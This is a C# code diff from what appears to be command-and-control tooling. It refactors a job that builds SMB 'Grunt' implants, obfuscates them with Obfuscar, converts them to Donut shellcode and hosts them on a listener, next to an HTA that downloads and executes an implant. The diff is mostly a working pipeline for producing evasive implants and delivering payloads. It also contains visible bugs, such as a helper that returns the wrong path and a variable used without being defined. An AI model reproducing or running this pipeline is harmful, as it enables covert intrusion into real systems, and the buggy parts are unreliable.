@@ -61,179 +61,210 @@ namespace Scorpion.Jobs
       Console.WriteLine("Saving HTA Script That Dowloands/Execs Default Grunt Binary");
       File.WriteAllBytes(defaultHttpHtaPath, Convert.FromBase64String(hostedBinaryLauncherHta.Content));
 
+      var nugetExePath = DownloadNugetExe(dataDir);
+      var donutExePath = DownloadDonutExe(dataDir);
+
       for (int i = 0; i < smbGruntCount; i++) {
         var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
 
-        var projDir = Path.Join(dataDir, aGuid);
-        if (!Directory.Exists(projDir)) {
-          Directory.CreateDirectory(projDir);
-        }
+        await ProvisionSmbGrunt(listener, aGuid, dataDir, nugetExePath, donutExePath);
 
-        if (!Directory.Exists(Path.Join(projDir, "Properies"))) {
-          Directory.CreateDirectory(Path.Join(projDir, "Properties"));
-        }
+      }
+      return await Task.FromResult(0);
+    }
 
-        Console.WriteLine($"Generating csproj for {aGuid}");
+    public async Task<int> ProvisionSmbGrunt(HttpListener listener, string aGuid, string dataDir, string nugetExePath, string donutExePath)
+    {
+      var request = new RequestBuilder(Api);
 
-        var csproj = GenerateCsprojFile(aGuid, projDir);
-        var csprojName = aGuid + ".csproj";
-        var csprojPath = Path.Join(projDir, csprojName);
-        Console.WriteLine($"Saving csproj for {aGuid}");
-        File.WriteAllBytes(csprojPath, Encoding.ASCII.GetBytes(csproj));
+      var projDir = Path.Join(dataDir, aGuid);
 
-        Console.WriteLine($"Generating Obfuscar for {aGuid}");
-        var obfuscar = GenerateObfuscarFile(aGuid, projDir);
-        var obfuscarName = aGuid + ".xml";
-        var obfuscarPath = Path.Join(projDir, obfuscarName);
-        Console.WriteLine($"Saving Obfuscar for {aGuid}");
-        File.WriteAllBytes(obfuscarPath, Encoding.ASCII.GetBytes(obfuscar));
+      if (!Directory.Exists(projDir)) {
+        Directory.CreateDirectory(projDir);
+      }
 
-        BinaryLauncher smbLauncher = await GenerateBasicSmbGruntBinary(aGuid, listener);
-        var rawSmbBin = Convert.FromBase64String(smbLauncher.Base64ILByteString);
-        var smbBinPath = Path.Join(projDir, "Downloaded.exe");
-        Console.WriteLine("Saving Unobfuscated Grunt Binary");
-        File.WriteAllBytes(smbBinPath, rawSmbBin);
-        var smbSrcPath = Path.Join(projDir, aGuid + ".cs");
-        Console.WriteLine("Saving SMB Grunt Stager Code");
-        File.WriteAllBytes(smbSrcPath, Encoding.ASCII.GetBytes(smbLauncher.StagerCode));
-        Console.WriteLine("Loading csproj for prgramatic build");
+      if (!Directory.Exists(Path.Join(projDir, "Properies"))) {
+        Directory.CreateDirectory(Path.Join(projDir, "Properties"));
+      }
 
-        var assemblyInfo = GenerateAssemblyInfo(aGuid);
-        var assemblyInfoName = "AssemblyInfo.cs";
-        var assemblyInfoPath = Path.Join(Path.Join(projDir, "Properties"), assemblyInfoName);
-        Console.WriteLine($"Saving Assembly Info for {aGuid}");
-        File.WriteAllBytes(assemblyInfoPath, Encoding.ASCII.GetBytes(assemblyInfo));
+      Console.WriteLine($"Generating csproj for {aGuid}");
 
-        if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
+      var csproj = GenerateCsprojFile(aGuid, projDir);
+      var csprojName = aGuid + ".csproj";
+      var csprojPath = Path.Join(projDir, csprojName);
+      Console.WriteLine($"Saving csproj for {aGuid}");
+      File.WriteAllBytes(csprojPath, Encoding.ASCII.GetBytes(csproj));
 
-          var nugetExePath = Path.Join(dataDir, "nuget.exe");
-          if (!File.Exists(nugetExePath)) {
-            Console.WriteLine("Downloading nuget.exe");
-            var wc = new System.Net.WebClient();
-            var dlUrl = "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe";
+      Console.WriteLine($"Generating Obfuscar for {aGuid}");
+      var obfuscar = GenerateObfuscarFile(aGuid, projDir);
+      var obfuscarName = aGuid + ".xml";
+      var obfuscarPath = Path.Join(projDir, obfuscarName);
+      Console.WriteLine($"Saving Obfuscar for {aGuid}");
+      File.WriteAllBytes(obfuscarPath, Encoding.ASCII.GetBytes(obfuscar));
 
-            wc.DownloadFile(dlUrl, nugetExePath);
-          }
+      BinaryLauncher smbLauncher = await GenerateBasicSmbGruntBinary(aGuid, listener);
+      var rawSmbBin = Convert.FromBase64String(smbLauncher.Base64ILByteString);
+      var smbBinPath = Path.Join(projDir, "Downloaded.exe");
+      Console.WriteLine("Saving Unobfuscated Grunt Binary");
+      File.WriteAllBytes(smbBinPath, rawSmbBin);
+      var smbSrcPath = Path.Join(projDir, aGuid + ".cs");
+      Console.WriteLine("Saving SMB Grunt Stager Code");
+      File.WriteAllBytes(smbSrcPath, Encoding.ASCII.GetBytes(smbLauncher.StagerCode));
+      Console.WriteLine("Loading csproj for prgramatic build");
 
+      var assemblyInfo = GenerateAssemblyInfo(aGuid);
+      var assemblyInfoName = "AssemblyInfo.cs";
+      var assemblyInfoPath = Path.Join(Path.Join(projDir, "Properties"), assemblyInfoName);
+      Console.WriteLine($"Saving Assembly Info for {aGuid}");
+      File.WriteAllBytes(assemblyInfoPath, Encoding.ASCII.GetBytes(assemblyInfo));
 
-          var frameworkDir = "C:\\Windows\\Microsoft.Net\\Framework";
-          Console.WriteLine($"Finding v4.x msbuild.exe by walking {frameworkDir}");
+      if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
 
-          var candidateDirs = Directory.GetDirectories(frameworkDir);
-          string frameworkVersionDir = "";
-          foreach (string candidate in candidateDirs) {
-            if (new DirectoryInfo(candidate).Name.StartsWith("v4.")) {
-              Console.WriteLine($"Found msbuild.exe at {candidate}");
-              frameworkVersionDir = Path.Join(frameworkDir, new DirectoryInfo(candidate).Name);
-              break;
-            }
-          }
-
-          if (!String.IsNullOrEmpty(frameworkVersionDir)) {
-
-            string obfuscarVersion = "2.2.25";
-            Process nugetInstallObfuscar = new Process();
-            ProcessStartInfo nugetInstallObfuscarInfo = new ProcessStartInfo();
-            // Redirect the output stream of the child process.
-            nugetInstallObfuscarInfo.UseShellExecute = false;
-            nugetInstallObfuscarInfo.RedirectStandardOutput = true;
-            nugetInstallObfuscarInfo.WorkingDirectory = projDir;
-            nugetInstallObfuscarInfo.FileName = Path.Join(dataDir, "nuget.exe");
-            nugetInstallObfuscarInfo.Arguments = $"install obfuscar -o {projDir}\\Obfuscar -Version {obfuscarVersion} -ExcludeVersion";
-            nugetInstallObfuscar.StartInfo = nugetInstallObfuscarInfo;
-            Console.WriteLine($"Building...");
-            nugetInstallObfuscar.Start();
-            string nugetInstallObfuscarOutput = nugetInstallObfuscar.StandardOutput.ReadToEnd();
-            nugetInstallObfuscar.WaitForExit();
-            Console.WriteLine(nugetInstallObfuscarOutput);
-            Console.WriteLine(nugetInstallObfuscar.ExitCode);
-            Console.WriteLine($"Nuget Obfuscar Install Exit Code: {nugetInstallObfuscar.ExitCode}");
-
-            var msbuildPath = Path.Join(frameworkVersionDir, "msbuild.exe");
-            var msbuildArgs = $"{csprojName} /p:Configuration=Release";
-
-            Console.WriteLine($"Building...");
-            Console.WriteLine($"Msbuild Path: {msbuildPath}");
-            Console.WriteLine($"Msbuild Args: {msbuildArgs}");
-
-            Process build = new Process();
-            ProcessStartInfo buildStartInfo = new ProcessStartInfo();
-            // Redirect the output stream of the child process.
-            buildStartInfo.UseShellExecute = false;
-            buildStartInfo.RedirectStandardOutput = true;
-            buildStartInfo.WorkingDirectory = projDir;
-            buildStartInfo.FileName = msbuildPath;
-            buildStartInfo.Arguments = msbuildArgs;
-
-            build.StartInfo = buildStartInfo;
-            build.Start();
-            string output = build.StandardOutput.ReadToEnd();
-            build.WaitForExit();
-
-            Console.WriteLine(output);
-            Console.WriteLine($"Build Exit Code: {build.ExitCode}");
-
-            string obfuscarBinPath = (string)Path.Join(Path.Join(Path.Join(Path.Join(projDir, "Obfuscar"), "Obfuscar"), "tools"), "Obfuscar.Console.exe");
-            string obfuscarArgs = Path.Join(projDir, aGuid + ".xml");
-
-            Console.WriteLine($"Obfuscating...");
-            Console.WriteLine($"Obfuscar Path: {obfuscarBinPath}");
-            Console.WriteLine($"Obfuscar Args: {obfuscarArgs}");
-
-            Process obfuscate = new Process();
-            ProcessStartInfo obfuscateStartInfo = new ProcessStartInfo();
-            // Redirect the output stream of the child process.
-            obfuscateStartInfo.UseShellExecute = false;
-            obfuscateStartInfo.RedirectStandardOutput = true;
-            obfuscateStartInfo.WorkingDirectory = projDir;
-            obfuscateStartInfo.FileName = obfuscarBinPath;
-            obfuscateStartInfo.Arguments = obfuscarArgs;
-            obfuscate.StartInfo = obfuscateStartInfo;
-
-            obfuscate.Start();
-            string obfuscateOutput = obfuscate.StandardOutput.ReadToEnd();
-            obfuscate.WaitForExit();
-
-            Console.WriteLine(obfuscateOutput);
-            Console.WriteLine($"Obfuscate Exit Code: {obfuscate.ExitCode}");
-
-            Console.WriteLine($"Moving msbuild compiled target to Compiled.exe");
-            File.Move(Path.Join(projDir, aGuid + ".exe"), Path.Join(projDir, "Compiled.exe"));
-
-            Console.WriteLine($"Moving obfuscated target out of obfuscated directory to Data directory");
-            var obfuscatedSmbBinPath = Path.Join(Path.Join(projDir, "obfuscated"), aGuid + ".exe");
-            var newSmbBinPath = Path.Join(dataDir, aGuid + ".exe");
-            File.Move(obfuscatedSmbBinPath, newSmbBinPath);
+        var msbuildPath = FindMsBuildExePath();
 
 
-            var hostedUrlPath = "/" + aGuid + ".exe";
-            Console.WriteLine($"Hosting obfsucated smb binary at path {hostedUrlPath}");
-            var hostedSmbBin = new HostedFile();
-            hostedSmbBin.ListenerId = listener.Id;
-            hostedSmbBin.Path = hostedUrlPath;
-            hostedSmbBin.Content = Convert.ToBase64String(File.ReadAllBytes(newSmbBinPath));
-            hostedSmbBin = await request.CreateHostedFile((int)listener.Id, hostedSmbBin);
-            Console.WriteLine($"Grunt generation complete for {aGuid}");
+        if (!String.IsNullOrEmpty(msbuildPath)) {
 
-          } else {
-            Console.WriteLine($"Not able to find directory in {frameworkDir} that starts with 'v4.'. Can't find msbuild.exe");
-          }
+          RunInstallNugetDepsForGrunt(projDir, nugetExePath);
+          RunMsbuildForGrunt(aGuid, projDir, msbuildPath, csprojName);
+          var obfuscatedBinPath = RunObfuscarForGrunt(aGuid, projDir, dataDir, obfuscarPath);
+          var hostedUrlPath = "/" + aGuid + ".exe";
+          Console.WriteLine($"Hosting obfsucated smb binary at path {hostedUrlPath}");
+          var hostedBin = new HostedFile();
+          hostedBin.ListenerId = listener.Id;
+          hostedBin.Path = hostedUrlPath;
+          hostedBin.Content = Convert.ToBase64String(File.ReadAllBytes(obfuscatedBinPath));
+          hostedBin = await request.CreateHostedFile((int)listener.Id, hostedBin);
+          Console.WriteLine($"Grunt generation complete for {aGuid}");
+
+          var shellcodePath = RunDonutForGrunt(aGuid, projDir, dataDir, donutExePath);
+          var shellcodeUrl = "/" + aGuid + ".bin";
+          Console.WriteLine($"Hosting obfuscated shellcode (donut) smb binary at path {shellcodeUrl}");
+          var hostedShellcode = new HostedFile();
+          hostedShellcode.ListenerId = listener.Id;
+          hostedShellcode.Path = shellcodeUrl;
+          hostedShellcode.Content = Convert.ToBase64String(File.ReadAllBytes(shellcodePath));
+          hostedShellcode = await request.CreateHostedFile((int)listener.Id, hostedShellcode);
+          Console.WriteLine($"Grunt generation complete for {aGuid}");
 
         } else {
-          Console.WriteLine("Not on windows. Skipping msbuild.");
+          Console.WriteLine($"Not able to find directory in C:\\Windows\\Microsoft.Net\\Framework that starts with 'v4.'. Can't find msbuild.exe");
         }
-        // msbuild csproj
-        // obsfucate output
-        // host ob bin at /aGuidob.exe
 
-        // TODO: need to implement implant functionality to find the correct implant template
-        // for smb
+      } else {
+        Console.WriteLine("Not on windows. Skipping msbuild.");
       }
-      //  generate multiple smb binaries 
-      //   download code and embed in visual studio projects
-      //   build locally and obfuscate
-      //   upload as hosted files
+
       return await Task.FromResult(0);
+    }
+    public string RunDonutForGrunt(string aGuid, string projDir, string dataDir, string donutExePath)
+    {
+      var source = Path.Join(dataDir, aGuid + ".exe");
+      var gruntShellcodePath = Path.Join(dataDir, aGuid + ".bin");
+      // x64, continue on fail, binary,exit with thread
+      var args = $"-a 2 -b 3 -f 1 -x 1 -o {gruntShellcodePath} {source}";
+      Console.WriteLine($"Generating shellcode...");
+      Console.WriteLine($"Donut Path: {donutExePath}");
+      Console.WriteLine($"Donut Args: {args}");
+
+      Process donut = new Process();
+      ProcessStartInfo startInfo = new ProcessStartInfo();
+      // Redirect the output stream of the child process.
+      startInfo.UseShellExecute = false;
+      startInfo.RedirectStandardOutput = true;
+      startInfo.WorkingDirectory = projDir;
+      startInfo.FileName = donutExePath;
+      startInfo.Arguments = args;
+      donut.StartInfo = startInfo;
+      donut.Start();
+      string output = donut.StandardOutput.ReadToEnd();
+      donut.WaitForExit();
+      Console.WriteLine(output);
+      Console.WriteLine($"Donut Exit Code: {donut.ExitCode}");
+
+      return gruntShellcodePath;
+
+    }
+
+    public string RunObfuscarForGrunt(string aGuid, string projDir, string dataDir, string obfuscarPath)
+    {
+      string obfuscarBinPath = (string)Path.Join(Path.Join(Path.Join(Path.Join(projDir, "Obfuscar"), "Obfuscar"), "tools"), "Obfuscar.Console.exe");
+      string args = Path.Join(projDir, aGuid + ".xml");
+
+      Console.WriteLine($"Obfuscating...");
+      Console.WriteLine($"Obfuscar Path: {obfuscarBinPath}");
+      Console.WriteLine($"Obfuscar Args: {args}");
+
+      Process obfuscate = new Process();
+      ProcessStartInfo startInfo = new ProcessStartInfo();
+      // Redirect the output stream of the child process.
+      startInfo.UseShellExecute = false;
+      startInfo.RedirectStandardOutput = true;
+      startInfo.WorkingDirectory = projDir;
+      startInfo.FileName = obfuscarBinPath;
+      startInfo.Arguments = args;
+      obfuscate.StartInfo = startInfo;
+
+      obfuscate.Start();
+      string output = obfuscate.StandardOutput.ReadToEnd();
+      obfuscate.WaitForExit();
+
+      Console.WriteLine(output);
+      Console.WriteLine($"Obfuscate Exit Code: {obfuscate.ExitCode}");
+      Console.WriteLine($"Moving msbuild compiled target to Compiled.exe");
+
+      File.Move(Path.Join(projDir, aGuid + ".exe"), Path.Join(projDir, "Compiled.exe"));
+      Console.WriteLine($"Moving obfuscated target out of obfuscated directory to Data directory");
+      var obfuscatedSmbBinPath = Path.Join(Path.Join(projDir, "obfuscated"), aGuid + ".exe");
+      var newSmbBinPath = Path.Join(dataDir, aGuid + ".exe");
+      File.Move(obfuscatedSmbBinPath, newSmbBinPath);
+      return newSmbBinPath;
+    }
+    public void RunMsbuildForGrunt(string aGuid, string projDir, string msbuildPath, string csprojName)
+    {
+      var msbuildArgs = $"{csprojName} /p:Configuration=Release";
+      Console.WriteLine($"Building...");
+      Console.WriteLine($"Msbuild Path: {msbuildPath}");
+      Console.WriteLine($"Msbuild Args: {msbuildArgs}");
+
+      Process build = new Process();
+      ProcessStartInfo startInfo = new ProcessStartInfo();
+      // Redirect the output stream of the child process.
+      startInfo.UseShellExecute = false;
+      startInfo.RedirectStandardOutput = true;
+      startInfo.WorkingDirectory = projDir;
+      startInfo.FileName = msbuildPath;
+      startInfo.Arguments = msbuildArgs;
+
+      build.StartInfo = startInfo;
+      build.Start();
+      string output = build.StandardOutput.ReadToEnd();
+      build.WaitForExit();
+
+      Console.WriteLine(output);
+      Console.WriteLine($"Build Exit Code: {build.ExitCode}");
+
+    }
+    public void RunInstallNugetDepsForGrunt(string projDir, string nugetExePath)
+    {
+      string obfuscarVersion = "2.2.25";
+      var args = $"install obfuscar -o {projDir}\\Obfuscar -Version {obfuscarVersion} -ExcludeVersion";
+      Process nugetInstall = new Process();
+      ProcessStartInfo startInfo = new ProcessStartInfo();
+      // Redirect the output stream of the child process.
+      startInfo.UseShellExecute = false;
+      startInfo.RedirectStandardOutput = true;
+      startInfo.WorkingDirectory = projDir;
+      startInfo.FileName = nugetExePath;
+      startInfo.Arguments = args;
+      nugetInstall.StartInfo = startInfo;
+      Console.WriteLine($"Building...");
+      nugetInstall.Start();
+      string output = nugetInstall.StandardOutput.ReadToEnd();
+      nugetInstall.WaitForExit();
+      Console.WriteLine(output);
+      Console.WriteLine(nugetInstall.ExitCode);
+      Console.WriteLine($"Nuget Obfuscar Install Exit Code: {nugetInstall.ExitCode}");
     }
 
     public async Task<HostedFile> FindOrCreateHostedDefaultHttpGruntHta(HttpListener listener, HostedFile hostedBinaryFile)
@@ -334,8 +365,8 @@ namespace Scorpion.Jobs
     {
       var request = new RequestBuilder(Api);
       var template = await request.GetImplantTemplateByName(TargetDefaultHttpTemplate);
-      var kd = DateTime.Now;
-      kd.AddDays(60);
+      var now = DateTime.Now;
+      var kd = now.AddDays(60);
       var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
 
       Console.WriteLine($"Generating Binary Launcher for template {template.Name}, listener {listener.Name} ({listener.Id})");
@@ -372,8 +403,8 @@ namespace Scorpion.Jobs
     {
       var request = new RequestBuilder(Api);
       var template = await request.GetImplantTemplateByName(TargetDefaultSmbTemplate);
-      var kd = DateTime.Now;
-      kd.AddDays(60);
+      var now = DateTime.Now;
+      var kd = now.AddDays(60);
 
       var bin = new BinaryLauncher();
       bin.ListenerId = listener.Id;
@@ -432,6 +463,63 @@ namespace Scorpion.Jobs
       Console.WriteLine("Listener created");
       return listener;
     }
+
+    public string DownloadDonutExe(string dataDir)
+    {
+      var donutExePath = Path.Join(dataDir, "donut.exe");
+      var donutZipPath = Path.Join(dataDir, "donut.zip");
+      var donutExtractPath = Path.Join(dataDir, "donut");
+
+      if (!File.Exists(donutExePath)) {
+        if (File.Exists(donutZipPath)) {
+          File.Delete(donutZipPath);
+        }
+        if (Directory.Exists(donutExtractPath)) {
+          DirectoryInfo donutExtractPathInfo = new DirectoryInfo(donutExtractPath);
+          foreach (FileInfo file in donutExtractPathInfo.GetFiles()) file.Delete();
+          foreach (DirectoryInfo subDirectory in donutExtractPathInfo.GetDirectories()) subDirectory.Delete(true);
+        }
+        Console.WriteLine("Downloading donut.exe");
+        var wc = new System.Net.WebClient();
+        var donutDlUrl = "https://github.com/TheWover/donut/releases/download/v0.9.3/donut_v0.9.3.zip";
+        wc.DownloadFile(donutDlUrl, donutZipPath);
+        System.IO.Compression.ZipFile.ExtractToDirectory(donutZipPath, donutExtractPath);
+        File.Move(Path.Join(donutExtractPath, "donut.exe"), donutExePath);
+      }
+      return donutExtractPath;
+    }
+
+    public string FindMsBuildExePath()
+    {
+      var frameworkDir = "C:\\Windows\\Microsoft.Net\\Framework";
+      Console.WriteLine($"Finding v4.x msbuild.exe by walking {frameworkDir}");
+
+      var candidateDirs = Directory.GetDirectories(frameworkDir);
+      string frameworkVersionDir = "";
+      foreach (string candidate in candidateDirs) {
+        if (new DirectoryInfo(candidate).Name.StartsWith("v4.")) {
+          Console.WriteLine($"Found msbuild.exe at {candidate}");
+          frameworkVersionDir = Path.Join(frameworkDir, new DirectoryInfo(candidate).Name);
+          break;
+        }
+      }
+      if (!String.IsNullOrEmpty(frameworkVersionDir)) {
+        return Path.Join(frameworkVersionDir, "msbuild.exe");
+      }
+      return "";
+    }
+    public string DownloadNugetExe(string dataDir)
+    {
+      var nugetExePath = Path.Join(dataDir, "nuget.exe");
+      if (!File.Exists(nugetExePath)) {
+        Console.WriteLine("Downloading nuget.exe");
+        var wc = new System.Net.WebClient();
+        var nugetDlUrl = "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe";
+        wc.DownloadFile(nugetDlUrl, nugetExePath);
+      }
+      return nugetExePath;
+    }
+
     public string GeneratePullAndExecBinaryHta(HttpListener listener, HostedFile hostedFile)
     {
       // TODO: make sure path starts with /
